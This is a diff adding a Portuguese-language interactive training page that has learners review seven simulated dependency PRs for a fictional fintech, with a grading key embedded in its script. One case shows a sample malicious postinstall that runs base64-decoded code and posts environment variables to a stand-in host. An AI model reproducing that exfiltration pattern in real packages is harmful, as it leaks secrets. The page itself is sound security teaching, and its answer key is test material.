@@ -1,0 +1,260 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; base-uri 'none'; form-action 'none'">
+<title>Supply Chain Lab - Revisão de Dependências</title>
+<style>
+:root{--bg:#0d1117;--panel:#161b22;--panel2:#1c2330;--line:#2d3646;--tx:#e6edf3;--mut:#9aa7b8;--acc:#4da3ff;--ok:#3fb950;--warn:#d29922;--bad:#f85149}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--tx);font:14px/1.5 system-ui,Segoe UI,Roboto,sans-serif}
+header{display:flex;flex-wrap:wrap;gap:12px;align-items:center;padding:10px 16px;background:var(--panel);border-bottom:1px solid var(--line)}
+header h1{font-size:16px;margin:0;margin-right:auto}header h1 small{color:var(--mut);font-weight:400;margin-left:8px}
+.kpi{background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:4px 10px;text-align:center;min-width:92px}
+.kpi b{display:block;font-size:18px}.kpi span{color:var(--mut);font-size:11px}
+input[type=text],textarea{background:var(--bg);color:var(--tx);border:1px solid var(--line);border-radius:6px;padding:6px 8px;font:inherit;width:100%}
+header input{width:190px}
+button{background:var(--acc);color:#04111f;border:0;border-radius:6px;padding:7px 12px;font:inherit;font-weight:600;cursor:pointer}
+button.sec{background:var(--panel2);color:var(--tx);border:1px solid var(--line)}
+button:disabled{opacity:.5;cursor:not-allowed}
+button:focus-visible,input:focus-visible,textarea:focus-visible,summary:focus-visible,.card:focus-visible{outline:2px solid var(--acc);outline-offset:2px}
+main{display:grid;grid-template-columns:320px 1fr;gap:12px;padding:12px;min-height:calc(100vh - 64px)}
+@media(max-width:860px){main{grid-template-columns:1fr}}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px}
+.card{border:1px solid var(--line);border-left:4px solid var(--line);border-radius:8px;padding:8px 10px;margin-bottom:8px;cursor:pointer;background:var(--panel2)}
+.card:hover,.card.sel{border-color:var(--acc)}.card.done{opacity:.7}.card .t{font-weight:600}.card .m{color:var(--mut);font-size:12px}
+h2{font-size:17px;margin:0 0 4px}h3{font-size:13px;text-transform:uppercase;letter-spacing:.05em;color:var(--mut);margin:16px 0 6px}
+p.lead{color:var(--mut);margin:0 0 10px}
+details{background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:6px 10px;margin-bottom:10px}summary{cursor:pointer;font-weight:600}details ul{margin:6px 0 2px;padding-left:18px}
+pre{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:10px;overflow:auto;white-space:pre-wrap;word-break:break-word;font:12.5px/1.5 Consolas,monospace;margin:0}
+table{width:100%;border-collapse:collapse}td,th{padding:5px 6px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top;font-size:13px}th{color:var(--mut);font-weight:500;width:34%}
+.chip{display:inline-block;border-radius:10px;padding:0 8px;font-size:11px;border:1px solid var(--line);color:var(--mut);margin-right:4px}
+.chip.ok{color:var(--ok);border-color:var(--ok)}.chip.no{color:var(--bad);border-color:var(--bad)}.chip.wr{color:var(--warn);border-color:var(--warn)}
+.chk{display:flex;flex-wrap:wrap;gap:6px;margin:6px 0}
+.out{background:var(--panel2);border-left:3px solid var(--acc);padding:6px 10px;margin:6px 0;font-size:13px}.out code{color:var(--mut);display:block;font-size:12px}
+fieldset{border:1px solid var(--line);border-radius:8px;margin:0 0 10px;padding:8px 10px}legend{color:var(--mut);font-size:12px;padding:0 4px}
+label.opt{display:block;padding:2px 0;cursor:pointer}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}@media(max-width:760px){.grid2{grid-template-columns:1fr}}
+.fb{border:1px solid var(--line);border-radius:8px;padding:10px;margin-top:12px;background:var(--panel2)}
+.err{color:var(--bad);margin:6px 0}.mut{color:var(--mut)}.badc{color:var(--bad)}.good{color:var(--ok)}
+dialog{background:var(--panel);color:var(--tx);border:1px solid var(--line);border-radius:12px;max-width:780px;width:92vw;max-height:88vh;overflow:auto}dialog::backdrop{background:#000a}
+</style>
+</head>
+<body>
+<header>
+  <h1>Supply Chain Lab<small>Revisão de PRs de dependência - OrbitaPay (fictício)</small></h1>
+  <input type="text" id="analyst" placeholder="Seu nome / RM (opcional)" aria-label="Nome" maxlength="60" autocomplete="off">
+  <div class="kpi"><b id="kRev">0/7</b><span>PRs revisados</span></div>
+  <div class="kpi"><b id="kOk">0</b><span>Vereditos certos</span></div>
+  <div class="kpi"><b id="kChk">0</b><span>Verificações feitas</span></div>
+  <button class="sec" id="bRep">Relatório</button>
+  <button id="bDeb">Debrief</button>
+  <button class="sec" id="bRst">Reiniciar</button>
+</header>
+<main>
+  <section class="panel" aria-label="Fila de PRs"><div id="list"></div></section>
+  <section class="panel" id="detail" aria-live="polite"></section>
+</main>
+<dialog id="dlg"></dialog>
+
+<script>
+"use strict";
+const $=s=>document.querySelector(s);
+function h(tag,props,...kids){const e=document.createElement(tag);for(const[k,v]of Object.entries(props||{})){if(k==='class')e.className=v;else if(k.startsWith('on'))e.addEventListener(k.slice(2),v);else if(v!==false&&v!=null)e.setAttribute(k,v);}for(const k of kids.flat()){if(k!=null)e.append(k);}return e;}
+
+/* ===== Catálogos ===== */
+const VERD={acc:'Aceitar',cond:'Aceitar com condições',rej:'Rejeitar',inv:'Investigar antes de decidir (bloquear por ora)'};
+const CHECKS=[['audit','Auditoria de vulnerabilidades (npm audit / osv-scanner)'],['who','Histórico de publicação e mantenedores'],['prov','Verificar assinatura / provenance'],['sbom','Diff do SBOM (dependências novas?)'],['integ','Comparar hash (integrity) do lockfile com o registry'],['scripts','Listar scripts de instalação / build'],['diff','Ler o diff entre as versões']];
+const SIGS={
+ s1:['Mantenedor ou publicador novo (ou mudou recentemente)','r'],s2:['Script de instalação novo (pre/postinstall)','r'],s3:['Código ofuscado (base64/eval) ou acesso à rede no instalador','r'],
+ s4:['Perdeu a assinatura/provenance que as versões anteriores tinham','r'],s5:['Nome parecido com o de um pacote popular (typosquatting)','r'],s6:['Pacote muito novo ou com pouquíssimos downloads','r'],
+ s7:['Mesmo nome de um pacote interno, com versão absurdamente alta (dependency confusion)','r'],s8:['Hash do lockfile mudou sem mudança de versão','r'],s9:['Binário opaco novo ou tarball diferente do repositório','r'],
+ s10:['O changelog/descrição do PR não explica o que o diff faz','r'],s11:['Mudança breaking (major) ou troca de licença','r'],
+ s12:['A favor: corrige vulnerabilidade conhecida','p'],s13:['A favor: provenance válida e mantenedor histórico','p']};
+const ACTS={
+ a1:'Mesclar após CI verde, com deploy gradual',a2:'Fixar a versão exata e manter o lockfile commitado',a3:'Desativar auto-merge: exigir revisão humana',a4:'Rodar testes e revisar as mudanças breaking antes de aceitar',
+ a5:'Encaminhar a mudança de licença ao jurídico/compliance',a6:'Rejeitar o PR e reportar o pacote ao registry / mantenedor',a7:'Acionar o time de segurança (abrir incidente)',
+ a8:'Verificar se CI/máquinas já instalaram a versão e rotacionar os segredos expostos',a9:'Usar registry com escopo (@orbita) e prioridade do registry interno',
+ a10:'Manter a versão atual e investigar a origem do hash/tarball antes de decidir',a11:'Usar o pacote correto no lugar e bloquear o nome falso',a12:'Analisar o código/binário em sandbox isolado (nunca na máquina do dev)'};
+
+/* ===== Casos (gabarito em ref) ===== */
+const CASES=[
+{id:'PR-101',eco:'npm',pkg:'jsonweb-parse',from:'4.0.0',to:'4.0.1',title:'chore(deps): bump jsonweb-parse from 4.0.0 to 4.0.1',by:'dependabot-sim',use:'Parser de payloads JSON no Serviço de Pagamentos.',
+ log:'4.0.1 - Melhorias de performance.',
+ meta:[['Publicado por','dev-helper99'],['Publicado em','hoje, 03:12 UTC'],['Downloads/semana','640 mil'],['Repositório','github.example/jsonweb-parse (tag v4.0.1: não encontrada)']],
+ chk:{audit:'Sem CVEs conhecidas para 4.0.0 ou 4.0.1 (lançamento recente, ainda não indexado). Ausência de CVE não significa que é seguro.',
+  who:'dev-helper99 foi adicionado como mantenedor há 3 dias; o mantenedor histórico (lsantos) foi removido. A versão 4.0.1 foi publicada às 03:12 UTC.',
+  prov:'4.0.0: provenance VÁLIDA (CI do repositório oficial). 4.0.1: SEM provenance (publicação manual com token).',
+  sbom:'Nenhuma dependência nova declarada.',integ:'OK: o hash do lockfile bate com o do registry (o hash prova que o arquivo é o publicado, não que ele é seguro).',
+  scripts:'NOVO: postinstall -> node scripts/setup.js (a 4.0.0 não tinha nenhum script).',
+  diff:`+ package.json
++   "scripts": { "postinstall": "node scripts/setup.js" }
++ scripts/setup.js
++   // decodifica uma string base64 e executa o resultado
++   const cmd = Buffer.from("<string codificada>", "base64").toString();
++   exec(cmd);
++   // envia dados do ambiente para um servidor externo
++   post("https://telemetry-cdn.example/c", process.env);
+  src/parse.js  (mudanças cosméticas: 6 linhas)`},
+ ref:{v:'rej',ok:['inv'],sig:{must:['s1','s2','s3','s4','s10'],ok:[]},act:{must:['a6','a7','a8'],ok:['a12','a3']},
+  why:'Quatro alertas juntos: publicador novo substituindo o histórico, perda de provenance, postinstall novo com código ofuscado e envio de variáveis de ambiente, tudo sob um changelog que diz só "performance". Atenção: se o CI já rodou "npm ci" neste PR, o postinstall pode ter executado lá, então verifique e rotacione os segredos do pipeline.'}},
+{id:'PR-102',eco:'pub (Dart/Flutter)',pkg:'flutter_charts_lite',from:'1.8.0',to:'2.0.0',title:'chore(deps): bump flutter_charts_lite from 1.8.0 to 2.0.0',by:'dependabot-sim',use:'Gráficos de extrato e gastos no App Mobile.',
+ log:'2.0.0 - BREAKING: ChartController.update() agora é assíncrono; removido o parâmetro legacyMode. Nova licença: AGPL-3.0 (antes MIT). Novos temas.',
+ meta:[['Publicado por','charts-lite.example (verified publisher)'],['Mantenedores','os mesmos desde 2022'],['Downloads/semana','210 mil'],['Repositório','tag 2.0.0 existe']],
+ chk:{audit:'Nenhuma vulnerabilidade conhecida.',who:'Publisher verificado; mantenedores inalterados desde 2022; tag 2.0.0 existe no repositório.',
+  prov:'Publicado via GitHub Actions (OIDC) a partir do repositório oficial. Verificado.',sbom:'+1 dependência transitiva: animations_core ^3.1.0 (publisher verificado, licença MIT).',
+  integ:'OK.',scripts:'Sem build hooks (hook/build.dart) no pacote.',
+  diff:`M lib/chart_controller.dart   (update() agora retorna Future<void>)
+M lib/chart_widget.dart       (remove legacyMode)
+M LICENSE                     (MIT -> AGPL-3.0)
+A lib/themes/                 (novos temas)`},
+ ref:{v:'cond',ok:[],sig:{must:['s11','s13'],ok:[]},act:{must:['a4','a5'],ok:['a2','a3']},
+  why:'Pacote legítimo (provenance válida, publisher verificado). O risco aqui NÃO é malware: é uma mudança breaking e uma troca de licença para AGPL, que pode obrigar a abrir o código do app. Aceite só depois de testes e parecer jurídico. Não é um caso para auto-merge.'}},
+{id:'PR-103',eco:'npm',pkg:'xmlkit-lite',from:'3.2.0',to:'3.2.1',title:'chore(deps): bump xmlkit-lite from 3.2.0 to 3.2.1',by:'dependabot-sim',use:'Leitura de arquivos XML de conciliação bancária.',
+ log:'3.2.1 - Corrige encoding UTF-16 em atributos.',
+ meta:[['Publicado por','rpacheco (mantenedor histórico)'],['Publicado em','há 5 dias'],['Downloads/semana','95 mil'],['Alterações no PR','package.json, package-lock.json']],
+ chk:{audit:'xmlkit-lite 3.2.1: sem vulnerabilidades conhecidas.',who:'xmlkit-lite: mantenedor histórico, sem mudanças. Um commit adicional no PR ("fix lockfile") foi feito por uma conta externa criada há 2 dias.',
+  prov:'xmlkit-lite@3.2.1: provenance VÁLIDA. tinyhttp-core@1.4.2: o tarball indicado no lockfile NÃO corresponde à attestation do registry.',
+  sbom:'Sem dependências novas, mas tinyhttp-core 1.4.2 muda de origem: do registry interno para mirror-cdn.example.',
+  integ:'DIVERGÊNCIA: tinyhttp-core@1.4.2 (mesma versão) tem hash diferente do registry. Mesmo número de versão, conteúdo diferente.',
+  scripts:'xmlkit-lite: nenhum. tinyhttp-core (do mirror): contém script "install" ausente na versão oficial.',
+  diff:`package-lock.json
+  "node_modules/xmlkit-lite":  3.2.0 -> 3.2.1   (integrity novo: esperado)
+  "node_modules/tinyhttp-core": version 1.4.2    (versão INALTERADA)
+-   "resolved": "https://registry.interno.orbita.example/tinyhttp-core/-/tinyhttp-core-1.4.2.tgz",
+-   "integrity": "sha512-Qm1x...AAA"
++   "resolved": "https://mirror-cdn.example/tinyhttp-core-1.4.2.tgz",
++   "integrity": "sha512-Zk9v...BBB"`},
+ ref:{v:'inv',ok:['rej'],sig:{must:['s8','s10'],ok:['s13']},act:{must:['a10'],ok:['a6','a7','a12','a3']},
+  why:'O pacote atualizado é legítimo, mas o PR traz de carona uma troca de origem e de hash de OUTRA dependência, sem mudança de versão e sem explicação, feita por uma conta nova. Lockfile é superfície de ataque: é tão importante revisar o diff do lockfile quanto o do código. Bloqueie e investigue.'}},
+{id:'PR-104',eco:'npm',pkg:'ratelimit-guard',from:'2.3.1',to:'2.3.2',title:'chore(deps): bump ratelimit-guard from 2.3.1 to 2.3.2',by:'dependabot-sim',use:'Limita tentativas de login no API Gateway.',
+ log:'2.3.2 - Corrige ReDoS na validação da janela (ADV-LAB-0042). Sem mudanças de API. Testes adicionados.',
+ meta:[['Publicado por','mcarvalho (mantenedor desde 2021, 38 releases)'],['Publicado em','há 3 dias'],['Downloads/semana','1,2 milhão'],['Repositório','tag v2.3.2 existe']],
+ chk:{audit:'ratelimit-guard@2.3.1: ALTA, ADV-LAB-0042 (ReDoS), corrigida em 2.3.2. A 2.3.2 não tem vulnerabilidades conhecidas. (ID fictício deste exercício.)',
+  who:'Publicado por mcarvalho, mantenedor histórico. Sem mudança de mantenedores nos últimos 12 meses. Última release anterior: 4 meses atrás.',
+  prov:'Provenance VÁLIDA: build do CI do repositório oficial (workflow release.yml, commit da tag v2.3.2). Assinatura verificada.',
+  sbom:'Sem dependências novas.',integ:'OK.',scripts:'Nenhum script de instalação.',
+  diff:`M src/window.js
+-  const RE = /^(\\d+)(s|m|h)+$/;   // backtracking catastrófico
++  const RE = /^(\\d+)(s|m|h)$/;
+A tests/window.test.js   (+18 linhas: entradas longas)`},
+ ref:{v:'acc',ok:[],sig:{must:['s12','s13'],ok:[]},act:{must:['a1'],ok:['a2']},
+  why:'Este PR é BOM e rejeitá-lo seria um erro: mantenedor histórico, provenance válida, diff mínimo que bate com o changelog e corrige uma vulnerabilidade ALTA do componente que protege o login. Segurança também é aceitar o que é seguro e rápido. (A política de cooldown de 7 dias tem exceção para correções de vulnerabilidade alta.)'}},
+{id:'PR-105',eco:'npm',pkg:'pay-validator',from:'2.4.0',to:'99.0.0',title:'chore(deps): bump pay-validator from 2.4.0 to 99.0.0',by:'dependabot-sim',use:'Validação de dados de pagamento (pacote INTERNO da OrbitaPay).',
+ log:'99.0.0 - (sem changelog)',
+ meta:[['Publicado por','unknown-user-7'],['Publicado em','ontem'],['Downloads/semana','12'],['Contexto interno','O pacote interno se chama @orbita/pay-validator (registry privado). O monorepo referencia "pay-validator" SEM escopo, e o .npmrc não define registry para esse nome.']],
+ chk:{audit:'"pay-validator" no registry PÚBLICO: criado ontem, 1 versão (99.0.0), 12 downloads.',who:'Publicador desconhecido, sem outros pacotes, sem repositório vinculado.',
+  prov:'Sem provenance.',sbom:'O SBOM atual lista pay-validator@2.4.0 vindo do registry interno. A versão 99.0.0 viria do registry público.',
+  integ:'O hash da 99.0.0 não existe no registry interno.',scripts:'99.0.0 tem preinstall: node setup.js',
+  diff:`package.json
+-  "pay-validator": "^2.4.0"
++  "pay-validator": "^99.0.0"
+.npmrc
+   (sem regra de escopo para pay-validator)`},
+ ref:{v:'rej',ok:['inv'],sig:{must:['s6','s7'],ok:['s2']},act:{must:['a6','a9'],ok:['a7','a8','a3']},
+  why:'Dependency confusion: o gerenciador prefere a MAIOR versão disponível e foi enganado por um nome interno publicado no registry público. A correção definitiva não é só rejeitar o PR: use pacotes com escopo (@orbita), registry interno com prioridade e reserve o nome no registry público.'}},
+{id:'PR-106',eco:'C / imagem base',pkg:'libcompress-lite',from:'5.6.0',to:'5.6.1',title:'chore(deps): bump libcompress-lite to 5.6.1 (imagem base do Gateway)',by:'dependabot-sim',use:'Biblioteca de compressão incluída na imagem de container do API Gateway.',
+ log:'5.6.1 - Melhor cobertura de testes e ajustes de build.',
+ meta:[['Publicado por','dev-helper42 (co-mantenedor há 2 meses)'],['Contexto','O mantenedor original está com baixa disponibilidade; nas últimas semanas várias contas novas pediram nas issues que "adicionem um co-mantenedor".'],['Histórico de dev-helper42','8 meses de contribuições pequenas e benignas'],['Downloads/semana','4 milhões (usada por muitas distros)']],
+ chk:{audit:'Sem vulnerabilidades conhecidas.',who:'dev-helper42 ganhou acesso de co-mantenedor há 2 meses. Esta é a primeira release assinada com a chave dele.',
+  prov:'Release assinada pela chave de dev-helper42. O tarball da release difere do "git archive" da tag v5.6.1: 1 arquivo a mais/modificado no tarball (build-aux/host-setup.m4).',
+  sbom:'Sem dependências novas.',integ:'OK: o hash do pacote bate com o tarball publicado (mas o tarball difere do repositório).',
+  scripts:'O build executa scripts de configure/m4 (autotools).',
+  diff:`A tests/fixtures/sample-corrupt.bin   (binário, 34 KB, "arquivo de teste corrompido")
+A tests/fixtures/sample-ok.bin        (binário, 12 KB)
+M build-aux/host-setup.m4             (+14 linhas: extrai e executa um trecho de um arquivo de teste durante o build)
+   (esta alteração existe só no tarball de release, não no repositório git)`},
+ ref:{v:'inv',ok:['rej'],sig:{must:['s1','s9','s10'],ok:[]},act:{must:['a10','a12'],ok:['a6','a7','a3']},
+  why:'Cadeia clássica de sequestro de mantenedor por engenharia social paciente: contribuidor "bonzinho" vira co-mantenedor sob pressão de contas novas, e a release traz binários opacos e um script de build alterado só no tarball. Nenhum scanner de CVE pegaria isso. Bloqueie e analise em sandbox; compare o tarball com o repositório.'}},
+{id:'PR-107',eco:'npm',pkg:'ratelimit-gaurd',from:'(novo)',to:'1.0.0',title:'feat: add rate limiting to /login',by:'bruno.lima (colega do time)',use:'PR de um colega adicionando uma NOVA dependência para limitar tentativas de login.',
+ log:'(README idêntico ao do pacote ratelimit-guard, incluindo os exemplos)',
+ meta:[['Publicado por','anon-pkg-2026'],['Criado em','há 5 dias'],['Downloads/semana','41'],['Repositório','nenhum link']],
+ chk:{audit:'Nenhuma CVE (pacote novo, sem histórico).',who:'Publicador anônimo, único pacote. Existe um pacote popular com nome muito parecido: ratelimit-guard (1,2 milhão de downloads/semana, desde 2021).',
+  prov:'Sem provenance (publicação manual).',sbom:'+1 dependência direta (ratelimit-gaurd) e +3 transitivas.',integ:'OK.',
+  scripts:'Nenhum script de instalação. Isso NÃO torna o pacote confiável.',
+  diff:`package.json
++  "ratelimit-gaurd": "^1.0.0"
+src/login.js
++  const rl = require('ratelimit-gaurd');`},
+ ref:{v:'rej',ok:[],sig:{must:['s5','s6'],ok:[]},act:{must:['a6','a11'],ok:['a7','a3']},
+  why:'Typosquatting: o nome troca duas letras do pacote legítimo, o README é copiado e o pacote é novo e quase sem uso. É um erro humano fácil de cometer (e o PR é de um colega bem-intencionado). Tratar com didática: devolva o PR indicando o nome correto (ratelimit-guard).'}}
+];
+
+/* ===== Estado ===== */
+let S;function fresh(){S={sel:null,run:{},done:{}};}fresh();
+function kpis(){const d=Object.values(S.done);$('#kRev').textContent=`${d.length}/${CASES.length}`;$('#kOk').textContent=d.filter(x=>x.g.v).length;$('#kChk').textContent=Object.values(S.run).reduce((s,x)=>s+x.size,0);}
+function list(){const b=$('#list');b.replaceChildren(h('details',null,h('summary',null,'Política de dependências da OrbitaPay'),h('ul',null,
+  h('li',null,'Auto-merge só para patch, com provenance válida e sem scripts novos.'),h('li',null,'Cooldown de 7 dias para versões recém-publicadas, exceto correção de vulnerabilidade alta/crítica.'),
+  h('li',null,'Pacotes internos usam o escopo @orbita e vêm do registry privado.'),h('li',null,'package-lock.json sempre commitado e revisado.'),h('li',null,'Pacote novo exige justificativa e verificação de reputação.'))));
+  CASES.forEach(c=>{const d=S.done[c.id];b.append(h('div',{class:`card${S.sel===c.id?' sel':''}${d?' done':''}`,tabindex:'0',role:'button','aria-label':c.id+' '+c.pkg,onclick:()=>pick(c.id),onkeydown:e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();pick(c.id);}}},
+    h('div',{class:'m'},h('b',null,c.id),' ',c.eco,d?h('span',{class:'chip ok',style:'margin-left:6px'},'revisado'):null),h('div',{class:'t'},`${c.pkg}  ${c.from} → ${c.to}`)));});kpis();}
+function pick(id){S.sel=id;list();detail();}
+
+/* ===== Detalhe ===== */
+function detail(){
+  const box=$('#detail');box.replaceChildren();
+  if(!S.sel){box.append(h('h2',null,'Bem-vindo à revisão de dependências'),h('p',{class:'lead'},'Você é a pessoa de segurança do time. O bot abriu PRs de atualização de dependências e um colega propôs um pacote novo. Há 7 PRs na fila.'),
+    h('ol',{class:'mut'},h('li',null,'Leia o PR e o changelog.'),h('li',null,'Execute as VERIFICAÇÕES que você acha necessárias (cada uma mostra evidências).'),h('li',null,'Decida: aceitar, aceitar com condições, rejeitar ou investigar.'),h('li',null,'Marque os sinais que viu e as ações que tomaria, e justifique.')),
+    h('p',{class:'mut'},'Dica: nem todo PR é perigoso, e nem todo PR perigoso parece perigoso. Todos os pacotes, pessoas e domínios são fictícios.'));return;}
+  const c=CASES.find(x=>x.id===S.sel);const done=S.done[c.id];const run=S.run[c.id]||(S.run[c.id]=new Set());
+  box.append(h('h2',null,`${c.id}: ${c.title}`),h('div',{class:'mut'},`${c.eco} | aberto por ${c.by}`),h('p',null,h('b',null,'Onde é usado: '),c.use),
+    h('h3',null,'Changelog'),h('pre',null,c.log),h('h3',null,'Metadados do registro'),h('table',null,...c.meta.map(([k,v])=>h('tr',null,h('th',null,k),h('td',null,v)))),
+    h('h3',null,'Verificações (clique para executar)'));
+  const outs=h('div');const chk=h('div',{class:'chk'});
+  const show=k=>{const lbl=CHECKS.find(x=>x[0]===k)[1];return h('div',{class:'out'},h('code',null,'$ '+lbl),k==='diff'?h('pre',{style:'margin-top:6px'},c.chk[k]):c.chk[k]);};
+  CHECKS.forEach(([k,l])=>chk.append(h('button',{class:'sec',disabled:run.has(k)?'':false,onclick:e=>{run.add(k);e.target.disabled=true;outs.append(show(k));kpis();}},l)));
+  [...run].forEach(k=>outs.append(show(k)));
+  box.append(chk,outs,h('h3',null,'Sua decisão'),form(c,done));
+  if(done)box.append(feedback(c,done));
+}
+function form(c,done){
+  const A=done?done.a:{};const dis=done?'':false;const f=h('div');
+  f.append(h('fieldset',null,h('legend',null,'Veredito'),...Object.entries(VERD).map(([k,t])=>h('label',{class:'opt'},h('input',{type:'radio',name:'v',value:k,checked:A.v===k?'':false,disabled:done?'':false}),' '+t))));
+  const g=(type,title)=>h('fieldset',null,h('legend',null,title),...Object.entries(SIGS).filter(([,s])=>s[1]===type).map(([k,s])=>h('label',{class:'opt'},h('input',{type:'checkbox',name:'s',value:k,checked:A.s&&A.s.includes(k)?'':false,disabled:done?'':false}),' '+s[0])));
+  f.append(h('div',{class:'grid2'},g('r','Sinais de risco que você observou'),g('p','Sinais a favor')));
+  f.append(h('fieldset',null,h('legend',null,'Ações que você tomaria'),...Object.entries(ACTS).map(([k,t])=>h('label',{class:'opt'},h('input',{type:'checkbox',name:'a',value:k,checked:A.a&&A.a.includes(k)?'':false,disabled:done?'':false}),' '+t))));
+  const note=h('textarea',{rows:'2',maxlength:'400',placeholder:'Justificativa: qual evidência decidiu o seu veredito?',disabled:done?'':false},A.note||'');const err=h('div',{class:'err',role:'alert'});
+  f.append(note,err,h('button',{disabled:done?'':false,onclick:()=>{const v=(f.querySelector('[name=v]:checked')||{}).value;const s=[...f.querySelectorAll('[name=s]:checked')].map(x=>x.value),a=[...f.querySelectorAll('[name=a]:checked')].map(x=>x.value);
+    if(!v||!a.length){err.textContent='Escolha um veredito e ao menos uma ação.';return;}
+    const a2={v,s,a,note:note.value.trim()};S.done[c.id]={a:a2,g:grade(c,a2)};list();detail();}},'Registrar revisão'));
+  return f;
+}
+function setCmp(sel,r){const miss=r.must.filter(x=>!sel.includes(x));const extra=sel.filter(x=>!r.must.includes(x)&&!r.ok.includes(x));return{miss,extra,ok:!miss.length&&!extra.length};}
+function grade(c,a){const r=c.ref;const ex=a.v===r.v,alt=r.ok.includes(a.v);return{v:ex||alt,exact:ex,alt:alt&&!ex,s:setCmp(a.s,r.sig),a:setCmp(a.a,r.act)};}
+function feedback(c,d){const g=d.g,r=c.ref;const pts=[g.v,g.s.ok,g.a.ok].filter(Boolean).length;
+  const chip=(ok,t,wr)=>h('span',{class:'chip '+(wr?'wr':ok?'ok':'no')},(ok?'✔ ':wr?'~ ':'✘ ')+t);
+  return h('div',{class:'fb'},h('b',null,`Análise de referência (${pts}/3)`),
+    h('div',{style:'margin:6px 0'},chip(g.v,g.exact?'Veredito':g.alt?'Veredito aceitável':'Veredito',g.alt),chip(g.s.ok,'Sinais'),chip(g.a.ok,'Ações')),
+    h('p',null,h('b',null,'Esperado: '),VERD[r.v]+(r.ok.length?` (também aceitável: ${r.ok.map(x=>VERD[x]).join(' / ')})`:'')),
+    g.s.miss.length?h('p',{class:'badc'},'Sinais que faltaram: '+g.s.miss.map(x=>SIGS[x][0]).join('; ')):null,g.s.extra.length?h('p',{class:'badc'},'Sinais que não se aplicam: '+g.s.extra.map(x=>SIGS[x][0]).join('; ')):null,
+    g.a.miss.length?h('p',{class:'badc'},'Ações que faltaram: '+g.a.miss.map(x=>ACTS[x]).join('; ')):null,g.a.extra.length?h('p',{class:'badc'},'Ações desnecessárias ou arriscadas aqui: '+g.a.extra.map(x=>ACTS[x]).join('; ')):null,
+    h('p',null,r.why));}
+
+/* ===== Debrief e relatório ===== */
+function debrief(){const d=$('#dlg');const dn=Object.values(S.done);
+  d.replaceChildren(h('h2',null,'Debrief'),h('p',null,`PRs revisados: ${dn.length}/${CASES.length} | Vereditos certos: ${dn.filter(x=>x.g.v).length} | Verificações executadas: ${Object.values(S.run).reduce((s,x)=>s+x.size,0)}`),
+   h('h3',null,'Checklist de revisão de dependência'),h('ol',null,
+    h('li',null,'Quem publicou? Mudou o mantenedor recentemente?'),h('li',null,'Tem provenance/assinatura? As versões anteriores tinham?'),h('li',null,'O diff e o changelog contam a mesma história?'),
+    h('li',null,'Há script de instalação/build novo, binário opaco ou rede no instalador?'),h('li',null,'O diff do lockfile mudou algo além do pacote do PR? Algum hash mudou sem mudança de versão?'),
+    h('li',null,'O nome é o do pacote que eu quero? Há versão de pacote interno no registry público?'),h('li',null,'O SBOM mudou? Há CVE conhecida (e o que acontece se eu NÃO atualizar)?')),
+   h('h3',null,'Discussão'),h('ol',null,
+    h('li',null,'Qual PR parecia o mais perigoso e era o mais seguro (PR-104)? O que o custo de rejeitar tudo por precaução causa ao time?'),
+    h('li',null,'Qual ataque nenhum scanner de CVE pegaria? Por quê? (CVE só lista falhas conhecidas, não backdoors novos.)'),
+    h('li',null,'Hash "OK" prova que o pacote é seguro? Em que caso o hash estava OK e mesmo assim havia risco?'),
+    h('li',null,'Como reduzir a janela entre publicação e adoção (cooldown) sem atrasar correções de vulnerabilidade?'),
+    h('li',null,'Em que ponto do pipeline vocês colocariam cada controle: PR, CI, registry interno, produção? (SBOM, provenance, lockfile, escopo, sandbox no CI.)')),
+   h('h3',null,'Casos reais para estudar (pesquise depois)'),h('ul',null,
+    h('li',null,'event-stream (2018): transferência de mantenedoria e dependência maliciosa.'),h('li',null,'ua-parser-js (2021): conta do mantenedor sequestrada.'),h('li',null,'Dependency confusion (2021): pacotes internos substituídos por versões públicas.'),
+    h('li',null,'colors/faker (2022): sabotagem pelo próprio mantenedor.'),h('li',null,'xz-utils (2024): co-mantenedor construído ao longo de meses, backdoor no tarball de release.'),h('li',null,'SolarWinds (2020): comprometimento do processo de build.')),
+   h('div',{style:'margin-top:12px'},h('button',{class:'sec',onclick:()=>d.close()},'Fechar')));d.showModal();}
+function report(){const who=$('#analyst').value.trim()||'(não informado)';let m=`# Revisão de dependências - Supply Chain Lab\n\nAnalista: ${who}\n\n`;
+  CASES.forEach(c=>{const d=S.done[c.id];m+=`## ${c.id} - ${c.pkg} ${c.from} -> ${c.to}\n`;if(!d){m+='- Não revisado\n\n';return;}
+    m+=`- Veredito: ${VERD[d.a.v]}\n- Sinais: ${d.a.s.map(x=>SIGS[x][0]).join('; ')||'-'}\n- Ações: ${d.a.a.map(x=>ACTS[x]).join('; ')}\n- Justificativa: ${d.a.note||'-'}\n\n`;});
+  const b=new Blob([m],{type:'text/markdown'});const u=URL.createObjectURL(b);const l=h('a',{href:u,download:'revisao-dependencias.md'});document.body.append(l);l.click();l.remove();setTimeout(()=>URL.revokeObjectURL(u),1000);}
+$('#bDeb').addEventListener('click',debrief);$('#bRep').addEventListener('click',report);
+$('#bRst').addEventListener('click',()=>{if(confirm('Reiniciar? Todo o progresso será apagado.')){fresh();list();detail();}});
+list();detail();
+</script>
+</body>
+</html>
